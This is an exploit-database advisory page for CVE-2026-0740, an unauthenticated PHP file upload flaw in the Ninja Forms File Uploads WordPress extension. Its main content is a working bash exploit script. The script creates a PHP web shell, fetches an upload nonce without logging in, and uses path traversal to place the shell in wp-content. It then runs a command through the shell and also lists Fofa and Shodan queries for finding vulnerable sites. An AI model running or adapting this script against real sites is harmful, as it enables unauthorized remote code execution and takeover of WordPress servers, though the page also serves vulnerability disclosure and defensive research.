---
title: Ninja Forms Uploads Unauthenticated PHP File Upload
url: https://cxsecurity.com/issue/WLB-2026050006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-13
fetch_date: 2026-05-14T05:45:31.505164
---

# Ninja Forms Uploads Unauthenticated PHP File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ninja Forms Uploads Unauthenticated PHP File Upload** **2026.05.13**  Credit:  **[Sélim Lanouar](https://cxsecurity.com/author/S%C3%A9lim%2BLanouar/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-0740](https://cxsecurity.com/cveshow/CVE-2026-0740/ "Click to see CVE-2026-0740")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: Ninja Forms Uploads - Unauthenticated PHP File Upload
# Date: 2026-04-09
# Exploit Author: Sélim Lanouar (@whattheslime)
# Vendor Homepage: https://ninjaforms.com/
# Software Link: https://ninjaforms.com/extensions/file-uploads/
# Version: 3.3.24
# Tested on: WordPress (6.9.3) on Apache and Nginx servers
# CVE: CVE-2026-0740
# Fofa Query: body="nfpluginsettings.js?ver="
# Shodan Query: http.html:"nfpluginsettings.js?ver="
# =============================================================================
if [ "$#" -ne 1 ]; then
echo "Usage: $0 <target\_url>"
exit 1
fi
target=$1
field\_id=$(head /dev/urandom | tr -dc '1-9' | head -c 16 ; echo)
file\_name=webshell.php
echo "[-] Writing webshell in /tmp/$file\_name..."
echo '<?php system($\_GET["cmd"]); ?>' > /tmp/$file\_name
echo "[-] Fetching nonce for random field\_id $field\_id..."
nonce=$(curl -s -X POST "$target/wp-admin/admin-ajax.php" \
-d "action=nf\_fu\_get\_new\_nonce&field\_id=$field\_id" | jq -r '.data.nonce')
echo "[+] Got nf\_fu\_upload nonce: $nonce"
echo "[-] Uploading webshell..."
response=$(curl -ks -X POST "$target/wp-admin/admin-ajax.php" \
-F "action=nf\_fu\_upload" \
-F "nonce=$nonce" \
-F "form\_id=$field\_id" \
-F "field\_id=$field\_id" \
-F "image\_jpg=../../../$file\_name" \
-F "files-$field\_id=@/tmp/$file\_name;filename=image.jpg;type=image/jpeg")
echo "[+] Upload response: $response"
command="curl -ks '$target/wp-content/$file\_name?cmd=id'"
echo "[-] Executing the 'id' command via the uploaded webshell: $command"
result=$(eval $command)
echo "[+] Command output: $result"

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026050006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top